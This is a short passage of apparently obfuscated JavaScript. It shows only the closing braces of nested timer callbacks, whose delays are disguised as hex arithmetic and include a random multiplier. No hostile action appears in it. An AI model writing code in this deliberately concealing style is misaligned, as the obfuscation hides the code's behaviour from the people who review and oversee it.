  }, (0x30d5 + -0x3 * 0xebb + 0x16b4) * getRandomInt(0xa7a + -0x1 * -0x25c1 + -0x303a, 0x887 + -0x2 * 0x9dc + 0xb36));
}, -0x1 * -0x1525 + -0x24d2 + -0x3 * -0x55b);